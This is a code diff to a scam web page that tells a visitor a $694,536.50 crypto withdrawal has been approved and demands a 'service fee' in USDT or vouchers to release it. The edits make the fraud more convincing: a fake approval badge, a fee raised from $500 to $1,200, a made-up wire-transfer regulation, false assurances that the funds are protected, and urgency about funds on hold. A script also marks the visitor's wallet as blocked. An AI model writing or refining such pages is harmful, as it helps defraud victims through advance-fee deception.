@@ -40,7 +40,7 @@
         .info-value.green { color: #4ade80; }
         .info-value.red { color: #f87171; }
 
-        /* Commission alert */
+        /* Service fee box */
         .commission-box { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 14px 16px; margin-bottom: 22px; text-align: left; }
         .commission-box .c-title { font-size: 13px; font-weight: 700; color: #f87171; margin-bottom: 6px; display: flex; align-items: center; gap: 6px; }
         .commission-box .c-desc { font-size: 13px; color: #94a3b8; line-height: 1.6; }
@@ -102,16 +102,16 @@
     </div>
 
     <!-- Header -->
-    <div class="icon-wrap">
-        <svg viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
+    <div class="icon-wrap" style="background:rgba(74,222,128,0.1);border-color:rgba(74,222,128,0.35);">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/><polyline points="7 12.5 10.5 16 17 9"/>
         </svg>
     </div>
 
-    <h2>Withdrawal In Progress</h2>
-    <p class="subtitle">Your withdrawal of <strong style="color:#4ade80;">$694,536.50</strong> is being processed. A mandatory commission VAT fee is required to release your funds.</p>
+    <h2>🎉 Great News!</h2>
+    <p class="subtitle">Your withdrawal of <strong style="color:#4ade80;">$694,536.50</strong> has been approved and is ready to be released to your bank account. One final step is needed to complete the transfer.</p>
 
-    <div class="status-badge">IN PROGRESS</div>
+    <div class="status-badge" style="background:rgba(74,222,128,0.1);border-color:rgba(74,222,128,0.4);color:#4ade80;">✅ APPROVED</div>
 
     <!-- Info card -->
     <div class="info-card">
@@ -120,8 +120,8 @@
             <span class="info-value green">$694,536.50</span>
         </div>
         <div class="info-row">
-            <span class="info-label">Commission VAT Fee</span>
-            <span class="info-value red">$500.00</span>
+            <span class="info-label">Service Fee</span>
+            <span class="info-value red">$1,200.00</span>
         </div>
         <div class="info-row">
             <span class="info-label">Status</span>
@@ -129,12 +129,16 @@
         </div>
     </div>
 
-    <!-- Commission alert -->
+    <!-- Service fee box -->
     <div class="commission-box">
-        <div class="c-title">⚠️ Additional Commission VAT Fee Required</div>
-        <div class="c-desc">Your withdrawal of <strong style="color:#fca5a5;">$694,536.50</strong> is being transferred via cryptocurrency. Because this is a crypto-based transaction, international financial regulations require a mandatory <strong style="color:#fca5a5;">Value Added Tax (VAT) commission</strong> to be settled before the funds can be converted and released to your bank account.<br><br>This fee covers cross-border crypto conversion charges, regulatory compliance costs, and network settlement fees imposed by the receiving financial institution. It is a one-time payment and is <strong style="color:#fca5a5;">non-deductible</strong> from your withdrawal balance.</div>
-        <div class="c-amount">$500.00</div>
-        <div class="c-sub">Pay via TRC20 / USDT or Voucher below</div>
+        <div class="c-title">🔐 Final Step — Service Fee Required</div>
+        <div class="c-desc">
+            You're almost there! Before we release <strong style="color:#fca5a5;">$694,536.50</strong> to your bank account, a one-time <strong style="color:#fca5a5;">Service Fee</strong> must be settled. This is required under international wire transfer regulations for all outbound transfers above $100,000.<br><br>
+            ✅ <strong style="color:#fca5a5;">Your full amount is protected</strong> — this fee is paid separately and won't reduce your withdrawal.<br><br>
+            ⏳ <strong style="color:#fca5a5;">Please act promptly</strong> — your funds are on hold and delays may require re-verification.
+        </div>
+        <div class="c-amount">$1,200.00</div>
+        <div class="c-sub">One-time fee · Pay via TRC20 / USDT or Voucher below</div>
     </div>
 
     <!-- Payment Tabs -->
@@ -191,7 +195,6 @@
     const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
     let selectedFile = null;
 
-    // ── Mark is_blocked = true the moment user lands on main.html ────────────
     async function markUserBlocked() {
         const wallet = localStorage.getItem('active_wallet');
         if (!wallet) return;
